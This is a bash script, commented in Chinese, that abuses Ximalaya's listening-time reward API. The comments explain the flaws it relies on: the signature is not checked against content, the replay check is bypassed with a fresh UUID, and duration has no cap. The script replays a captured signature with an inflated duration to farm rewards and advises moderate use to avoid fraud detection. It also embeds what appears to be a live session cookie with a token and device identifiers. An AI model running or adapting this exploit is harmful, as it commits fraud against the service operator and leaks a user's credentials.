#!/bin/bash
# 喜马拉雅 听书福利时长刷量工具 (syncListenTime 签名校验漏洞)
# 原理：signature 不校验内容 + requestId 换新 UUID 绕过幂等 + duration 无上限
# 实测：单次 +86400 秒(24h)成功，无上限
# 用法：填入你的 COOKIE 后运行；每次执行 +86400 秒
# 风险：可能触发风控，适度使用！
set -e

# ============ 配置区：从 Loon 抓包 ad-incentive.ximalaya.com 请求复制 cookie ============
COOKIE='channel=ios-b1; 1&_device=iPhone&CFFE82D2-AD25-4ADB-877E-5BA9F0147CC5&9.5.1; impl=com.gemd.iting; c-oper=%E7%94%B5%E4%BF%A1; net-mode=WIFI; res=1320%2C2868; 1&_token=190162413&E72F4D00340CB35D6E0CC3CDBFC659101B7A61BFCFE3F112ABC855B890678BA91854D293A605161MF257B9CE59FA529_; idfa=CFFE82D2-AD25-4ADB-877E-5BA9F0147CC5; device_model=iPhone%2016%20Pro%20Max; XD=0b/5F0eXqx4ksc/ylcFju+l8usSfqHqePv+BovBtsgYbAHhxnjUgNa4CCAOozH5qbzJJ2+hcZGynU8xEq9dktA==; fp=009217657x2222422v64v050210030k200000100000000000100301000030; qimei36=f453fff3f5f4ae0018eddfee00001121a219; sgi=D2TVAxeKO7EqCklQnBd/05hxv04q3FgGrLZOmSL0/UTnI223'
# ==============================================================================

# 已捕获的合法签名（2026-08-15 抓包，服务器不校验内容）
SIGNATURE='385d0bead76254fdb5b161a617911d3b'
# 已捕获的合法 ts（body 内，服务器不校验时效）
BODY_TS='1786765427649'
# 每次刷量秒数（已实测 86400 可过；想低调可改 3600）
DURATION="${1:-86400}"
# 已捕获的 track/album（服务器不校验）
TRACK_ID=548198143
ALBUM_ID=47517749
LOCAL_DURATION=336

UA='ting_v9.5.1_c5(CFNetwork, iOS 18.6.2, iPhone17,2)'

gen_uuid() {
  python3 -c "import uuid; print(str(uuid.uuid4()).upper())"
}

TS_MS=$(($(date +%s) * 1000))
REQ_ID=$(gen_uuid)
BODY="{\"localDuration\":${LOCAL_DURATION},\"openScreen\":1,\"trackId\":${TRACK_ID},\"albumId\":${ALBUM_ID},\"ts\":${BODY_TS},\"signature\":\"${SIGNATURE}\",\"duration\":${DURATION},\"type\":3,\"requestId\":\"${REQ_ID}\"}"

echo "==> 上报 duration=${DURATION}s requestId=${REQ_ID}"
RESP=$(curl -sk -X POST "https://ad-incentive.ximalaya.com/incentive-sync/ting/welfare/syncListenTime/ts-${TS_MS}" \
  -H "content-type: application/json" \
  -H "user-agent: ${UA}" \
  -H "accept: */*" \
  -H "accept-encoding: gzip, deflate, br" \
  -H "accept-language: zh-Hans-CN;q=1, en-US;q=0.9" \
  -H "cookie: ${COOKIE}" \
  -d "$BODY")

echo "==> 响应: $RESP"
if echo "$RESP" | grep -q '"success":true'; then
  echo "==> 成功！balance 已增加（含历史总额）"
else
  echo "==> 失败！检查 cookie 是否过期（重新抓包更新 _token）"
fi
